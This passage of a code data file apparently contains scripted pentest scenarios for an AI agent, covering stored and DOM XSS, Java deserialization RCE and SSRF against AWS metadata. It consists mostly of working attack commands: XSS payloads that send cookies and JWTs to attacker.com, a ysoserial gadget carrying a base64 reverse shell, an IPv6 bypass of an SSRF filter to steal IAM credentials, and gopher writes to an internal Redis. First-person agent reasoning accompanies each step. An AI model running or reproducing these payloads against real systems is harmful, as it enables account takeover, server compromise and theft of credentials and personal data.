  },

  // A07:2021 - XSS
  {
    id: "owasp-a07-xss-stored-dom",
    category: "OWASP Top 10",
    subcategory: "A07 - Cross-Site Scripting",
    title: "Stored XSS via Markdown Rendering and DOM-based XSS Chain",
    difficulty: "intermediate",
    description: "Stored XSS through markdown injection in user comments, chained with DOM-based XSS for account takeover.",
    target_description: "Community forum at https://forum.target.com with Markdown support in posts/comments. React frontend with SSR.",
    attack_phases: [
      {
        phase: "XSS Vector Discovery",
        description: "Test for XSS in markdown-rendered content",
        tools: ["dalfox", "curl"],
        commands: [
          "dalfox url 'https://forum.target.com/search?q=test' --mining-dom --deep-domxss",
          "curl -s -X POST https://forum.target.com/api/posts/1/comments -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"body\":\"[click me](javascript:alert(document.domain))\"}'",
          "curl -s -X POST https://forum.target.com/api/posts/1/comments -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"body\":\"![img](x onerror=alert(1))\"}'",
          "curl -s -X POST https://forum.target.com/api/posts/1/comments -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"body\":\"<details open ontoggle=alert(document.cookie)><summary>Click</summary></details>\"}'",
        ],
        expected_output: `DOM XSS found in search: document.write(location.hash) in /assets/app.js:342

Stored XSS via HTML in markdown:
Comment posted successfully with <details> tag — ontoggle fires on page load.`,
        thinking: "Found two XSS vectors: 1) DOM-based XSS in search via location.hash being passed to document.write — classic DOM sink, 2) Stored XSS through HTML injection in markdown comments. The markdown parser allows raw HTML, and <details open ontoggle=...> fires automatically without user interaction. This is especially dangerous as stored XSS because every user who views the post will execute the payload. I can chain this for session hijacking or account takeover by stealing cookies/tokens.",
        analysis: "DOM-based XSS in search + Stored XSS in comments via markdown HTML injection. Auto-firing payload via <details ontoggle>. Cookie/token theft possible.",
        next_action: "Build account takeover payload and demonstrate impact",
      },
      {
        phase: "Account Takeover via XSS",
        description: "Craft payload for session hijacking and demonstrate impact",
        tools: ["curl"],
        commands: [
          "curl -s -X POST https://forum.target.com/api/posts/1/comments -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"body\":\"<details open ontoggle=\\\"fetch(\\x27https://attacker.com/steal?c=\\x27+document.cookie)\\\"><summary>Important Update</summary>Please read the updated guidelines.</details>\"}'",
          "curl -s -X POST https://forum.target.com/api/posts/1/comments -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"body\":\"<details open ontoggle=\\\"fetch(\\x27/api/users/me\\x27,{headers:{\\x27Authorization\\x27:\\x27Bearer \\x27+localStorage.getItem(\\x27token\\x27)}}).then(r=>r.json()).then(d=>fetch(\\x27https://attacker.com/exfil\\x27,{method:\\x27POST\\x27,body:JSON.stringify(d)}))\\\"><summary>Notice</summary></details>\"}'",
        ],
        expected_output: `Comment posted. When any user views the thread:
1. Cookie exfiltrated to attacker.com
2. User profile data (PII) exfiltrated via API call
3. JWT token from localStorage stolen

Attacker receives:
{"id":"user-42","username":"victim","email":"victim@corp.com","role":"admin","token":"eyJ..."}`,
        thinking: "The stored XSS payload fires automatically for every visitor to the post. The first payload steals cookies, the second exfiltrates the user's full profile including their JWT from localStorage. If an admin views this post, I get their admin JWT and can take over their account. This is a critical finding — stored XSS with auto-execution and no user interaction required beyond viewing the page.",
        analysis: "Stored XSS enables automatic session hijacking and PII exfiltration. No click required. Admin account takeover demonstrated.",
        next_action: "Generate report with remediation (CSP, markdown sanitization, HttpOnly cookies)",
      },
    ],
    cve_references: ["CWE-79"],
    tools_involved: ["dalfox", "curl", "report_generator"],
    tags: ["xss", "stored-xss", "dom-xss", "markdown-injection", "account-takeover", "session-hijacking"],
  },

  // A08:2021 - Software and Data Integrity Failures (Deserialization)
  {
    id: "owasp-a08-deserialization",
    category: "OWASP Top 10",
    subcategory: "A08 - Software and Data Integrity Failures",
    title: "Java Deserialization RCE via Insecure Object Handling",
    difficulty: "expert",
    description: "Exploiting Java deserialization vulnerability in a Spring Boot application to achieve remote code execution.",
    target_description: "Enterprise Java application at https://enterprise.target.com running Spring Boot 2.x with Apache Commons Collections in classpath.",
    attack_phases: [
      {
        phase: "Deserialization Point Discovery",
        description: "Identify endpoints accepting serialized Java objects",
        tools: ["nuclei", "curl", "nmap"],
        commands: [
          "nmap -sV -p 8080,8443 enterprise.target.com --script=http-headers",
          "nuclei -u https://enterprise.target.com -tags deserialization,java,spring -severity critical,high",
          "curl -s -X POST https://enterprise.target.com/api/session -H 'Content-Type: application/x-java-serialized-object' -d @test_serial.bin -v",
          "curl -s -v https://enterprise.target.com/actuator/env",
          "curl -s -v https://enterprise.target.com/actuator/heapdump -o heapdump.hprof",
        ],
        expected_output: `Server: Apache Tomcat/9.0.65
X-Powered-By: Spring Boot 2.7.5

Nuclei findings:
[spring-actuator-exposed] [high] https://enterprise.target.com/actuator
[java-deserialization] [critical] https://enterprise.target.com/api/session

Actuator /env exposes:
{"spring.datasource.url":"jdbc:postgresql://db.internal:5432/enterprise","spring.redis.host":"redis.internal"}`,
        thinking: "Spring Boot actuator endpoints are exposed without authentication — this alone is a high severity finding (env exposes secrets, heapdump contains memory). More critically, the /api/session endpoint accepts Content-Type: application/x-java-serialized-object, which means it deserializes user-supplied Java objects. With Apache Commons Collections on the classpath, I can use ysoserial to generate a gadget chain for RCE. Let me build the exploit.",
        analysis: "Spring Boot actuator exposed. Java deserialization endpoint found at /api/session. Commons Collections gadget chain available for RCE.",
        next_action: "Generate ysoserial payload and achieve RCE",
      },
      {
        phase: "Deserialization RCE",
        description: "Exploit deserialization to execute commands",
        tools: ["curl"],
        commands: [
          "java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/callback' > payload.bin",
          "curl -s -X POST https://enterprise.target.com/api/session -H 'Content-Type: application/x-java-serialized-object' --data-binary @payload.bin -v",
          "java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}' > revshell.bin",
          "curl -s -X POST https://enterprise.target.com/api/session -H 'Content-Type: application/x-java-serialized-object' --data-binary @revshell.bin -v",
        ],
        expected_output: `Callback received at attacker.com - RCE confirmed!

Reverse shell established:
$ id
uid=1000(spring) gid=1000(spring) groups=1000(spring),999(docker)
$ hostname
enterprise-web-prod-1
$ cat /opt/app/application.properties
spring.datasource.password=Pr0d_DB_P@ss2024!`,
        thinking: "RCE achieved via Java deserialization. The CommonsCollections6 gadget chain worked, giving us a reverse shell as the 'spring' user. Notably, this user is in the 'docker' group which means potential container escape. The application.properties file contains production database credentials. This is as critical as it gets — full server compromise through a single HTTP request with a serialized payload.",
        analysis: "Full RCE via Java deserialization. Docker group membership enables container escape. Production database credentials exposed in application.properties.",
        next_action: "Document findings including actuator exposure, deserialization RCE, and credential exposure",
      },
    ],
    cve_references: ["CWE-502", "CVE-2015-7501"],
    tools_involved: ["nmap", "nuclei", "curl", "report_generator"],
    tags: ["deserialization", "java", "spring-boot", "rce", "ysoserial", "actuator", "commons-collections"],
  },

  // A10:2021 - SSRF
  {
    id: "owasp-a10-ssrf-cloud",
    category: "OWASP Top 10",
    subcategory: "A10 - SSRF",
    title: "SSRF to Cloud Metadata and Internal Service Access",
    difficulty: "advanced",
    description: "Server-Side Request Forgery exploited to access cloud metadata service, internal APIs, and perform port scanning of internal network.",
    target_description: "Web application at https://webapp.target.com hosted on AWS EC2 with a URL preview/fetch feature at /api/preview.",
    attack_phases: [
      {
        phase: "SSRF Detection",
        description: "Identify and confirm SSRF in URL preview feature",
        tools: ["curl", "ssrfmap"],
        commands: [
          "curl -s -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d '{\"url\":\"https://httpbin.org/get\"}' | jq .",
          "curl -s -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d '{\"url\":\"http://127.0.0.1:80\"}'",
          "curl -s -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'",
          "curl -s -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d '{\"url\":\"http://[::ffff:169.254.169.254]/latest/meta-data/\"}'",
          "curl -s -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d '{\"url\":\"http://169.254.169.254.nip.io/latest/meta-data/\"}'",
        ],
        expected_output: `Direct 169.254.169.254 blocked: "Error: URL not allowed"
IPv6 bypass successful:
ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-id
local-hostname
local-ipv4
public-hostname
public-ipv4
security-groups`,
        thinking: "The application blocks direct requests to 169.254.169.254 but the IPv6-mapped bypass worked ([::ffff:169.254.169.254]). This means the SSRF filter checks for the literal IP string but doesn't handle IPv6 representations. I can now access the AWS metadata service. Let me extract IAM credentials from the instance role, which will give me AWS API access with whatever permissions the EC2 instance has.",
        analysis: "SSRF confirmed with IPv6 bypass for metadata access. Direct IP blocked but alternative representations work. AWS metadata service accessible.",
        next_action: "Extract IAM credentials from metadata service",
      },
      {
        phase: "AWS Credential Theft via SSRF",
        description: "Extract IAM role credentials from EC2 metadata",
        tools: ["curl"],
        commands: [
          "curl -s -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d '{\"url\":\"http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/\"}'",
          "curl -s -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d '{\"url\":\"http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/webapp-ec2-role\"}'",
          "curl -s -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d '{\"url\":\"http://[::ffff:169.254.169.254]/latest/user-data\"}'",
        ],
        expected_output: `IAM Role: webapp-ec2-role

Credentials:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalr...",
  "Token": "IQoJb3Jp...",
  "Expiration": "2024-01-15T12:00:00Z"
}

User-data script:
#!/bin/bash
export DB_PASSWORD="RDS_Pr0d_2024!"
export REDIS_AUTH="R3d1s_S3cr3t"
aws s3 sync s3://webapp-deploy/config /opt/app/config`,
        thinking: "I've extracted temporary AWS credentials from the IAM role attached to the EC2 instance. These credentials can be used externally with the AWS CLI. I also got the user-data script which contains hardcoded database and Redis passwords, plus reveals an S3 bucket with configuration files. Now I should: 1) Use the IAM credentials to enumerate AWS permissions, 2) Try accessing the S3 config bucket, 3) Also use the SSRF to scan the internal network for other services (Redis, database, internal APIs).",
        analysis: "IAM temporary credentials extracted. User-data exposes DB and Redis passwords. S3 deployment bucket discovered. Full cloud compromise path established.",
        next_action: "Internal network scanning via SSRF and AWS enumeration with stolen credentials",
      },
      {
        phase: "Internal Network Exploitation",
        description: "Use SSRF to access internal services",
        tools: ["curl", "ssrfmap"],
        commands: [
          "for port in 80 443 3000 3306 5432 6379 8080 8443 9200 27017; do curl -s -o /dev/null -w \"Port $port: %{http_code}\\n\" -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d \"{\\\"url\\\":\\\"http://[::ffff:10.0.1.50]:$port/\\\"}\"; done",
          "curl -s -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d '{\"url\":\"http://[::ffff:10.0.1.50]:6379/\"}'",
          "curl -s -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d '{\"url\":\"http://[::ffff:10.0.1.50]:9200/_cat/indices\"}'",
          "curl -s -X POST https://webapp.target.com/api/preview -H 'Content-Type: application/json' -d '{\"url\":\"gopher://[::ffff:10.0.1.50]:6379/_SET%20pwned%20true%0D%0A\"}'",
        ],
        expected_output: `Internal port scan:
Port 6379: 200 (Redis)
Port 9200: 200 (Elasticsearch)
Port 5432: 200 (PostgreSQL)

Redis unauthenticated:
$5 PONG

Elasticsearch indices:
green open users      5 1 15423 0 12.3mb 6.1mb
green open logs       5 1 892341 0 2.1gb  1.0gb
green open payments   5 1 8921  0 45.2mb 22.6mb`,
        thinking: "Through SSRF I've mapped the internal network. Found: 1) Redis on 10.0.1.50:6379 — unauthenticated, responds to commands, 2) Elasticsearch on 10.0.1.50:9200 — unauthenticated, has user, logs, and payment indices, 3) PostgreSQL on 10.0.1.50:5432 — likely accessible with the credentials from user-data. The gopher:// protocol support means I can send arbitrary data to internal services — this allows Redis exploitation (write webshell via Redis, or manipulate cached data). This is a complete internal network compromise via SSRF.",
        analysis: "Internal network mapped. Redis, Elasticsearch, PostgreSQL all accessible without auth. Gopher protocol enables arbitrary protocol interaction. Complete internal compromise.",
        next_action: "Generate comprehensive report documenting SSRF → metadata → IAM → internal network chain",
      },
    ],
    cve_references: ["CWE-918"],
    tools_involved: ["curl", "ssrfmap", "report_generator"],
    tags: ["ssrf", "aws", "metadata", "iam", "cloud", "internal-network", "redis", "elasticsearch", "gopher"],
  },
];
